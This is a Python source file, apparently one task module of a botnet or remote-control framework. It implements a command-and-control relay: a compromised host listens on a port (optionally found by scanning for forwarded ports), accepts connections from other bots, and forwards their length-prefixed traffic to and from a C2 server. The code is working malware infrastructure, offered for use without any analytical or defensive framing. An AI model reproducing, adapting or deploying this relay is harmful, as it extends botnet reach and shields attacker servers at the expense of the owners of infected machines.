import struct
import socket

from tasks.__task import Task
from tasks.forwaded_ports import ForwadedPorts


class _Bot(Task):
    def __init__(self):
        super(_Bot, self).__init__(0)
        import logging
        import threading

        self.logger = logging.getLogger(self.__class__.__name__)

        self.server_socket = None
        self.bot_socket = None

        self._run = threading.Event()

    def run(self, bot_socket: socket.socket, bot_ip, bot_port, c2_server_ip, c2_server_port):
        from time import sleep

        server_socket = socket.create_connection((c2_server_ip, c2_server_port), timeout=1)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.logger.info("Entering relay loop for bot {}:{}".format(bot_ip, bot_port))
        self._run.set()
        while self._run.is_set():
            bot_data = self.read(bot_socket)
            if bot_data:
                self.write(server_socket, bot_data)

            server_data = self.read(server_socket)
            if server_data:
                self.write(bot_socket, server_data)

            sleep(0.1)

        if bot_socket:
            bot_socket.close()
        if server_socket:
            server_socket.close()

    def read(self, sock) -> bytes:
        header_size = struct.calcsize('!L')
        try:
            header = sock.recv(header_size)
            if not header:
                self._run.clear()
                return header

        except Exception as e:  # noqa
            header = ""

        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            data = sock.recv(msg_size)
            if not data:
                self._run.clear()
                return data
        else:
            data = b""
        return data

    def write(self, sock, data: bytes):  # noqa
        if sock:
            try:
                data = struct.pack('!L', len(data)) + data
                sock.sendall(data)
            except Exception:  # noqa
                pass

    def stop(self):
        self._run.clear()


class Relay(Task):
    """C2 relay forwards messages to clients."""
    platforms = ["win32", "linux", "darwin"]
    description = __doc__
    administrator = {"win32": False, "linux": False, "darwin": False}
    kwargs = {"port": {"type": int, "description": "Port to use. If set to 0, bot will scan for forwaded ports.",
                       "default": 0},
              "max_clients": {"type": int, "description": "Maximum clients amount. If set to 0 limit will be disabled.",
                              "default": 0}}
    stop_if_disconnected = True

    def __init__(self, task_id):
        super(Relay, self).__init__(task_id)
        import logging
        import threading

        self.logger = logging.getLogger(self.__class__.__name__)

        self.bots = []
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.settimeout(5)
        self._run = threading.Event()

    def run(self, c2_server_ip: str = "127.0.0.1", c2_server_port=8192, **kwargs):
        assert "port" in kwargs, "Missing keyword argument port!"
        assert "max_clients" in kwargs, "Missing keyword argument max_clients!"

        port = int(kwargs.get("port"))
        max_clients = int(kwargs.get("max_clients"))

        assert max_clients >= 0, "Max client amount must be >= 0!"
        assert port >= 0, "Port must be >= 0!"

        from time import sleep
        ip = socket.gethostbyname(socket.gethostname())
        if port == 0:
            try:
                port = ForwadedPorts(0)
                session = port.start()
                resp = session.join()

                result = resp.get("result")
                if int(resp.get("exit_code")) == 0 and result is not None:
                    ip = result.get("ip")
                    port = result.get("port")
                    public_ip = result.get("public_ip")
            except Exception:
                self.logger.warning("Could not setup relay, could not find any forwaded ports!")
                raise Exception("Could not setup relay, could not find any forwaded ports!")

        self.server.bind((ip, port))
        self.server.listen(5)
        self._run.set()
        self.logger.info("Started listening on {}:{}".format(ip, port))

        while self._run.is_set():
            try:
                if max_clients and len(self.bots) >= max_clients:
                    continue

                else:
                    sock, addr = self.server.accept()
                    sock.settimeout(1)
                    self.logger.info("Connection from {}:{}".format(addr[0], addr[1]))

                    bot = _Bot()
                    bot.set_thread(bot.start(sock, addr[0], addr[1], c2_server_ip, c2_server_port))
                    self.bots.append(bot)

                    for bot in self.bots:
                        if not bot.is_alive():
                            bot.join()
                            self.bots.remove(bot)

            except socket.timeout:
                pass

            except Exception as e:
                self.logger.error("Relay server error: {}".format(e))
            sleep(0.5)
        self.server.close()

    def stop(self):
        self._run.clear()
        self.server.close()
        for bot in self.bots:
            bot.stop()
            bot.join()
        self.logger.info("Relay task {} stopped successfully.".format(self.id))
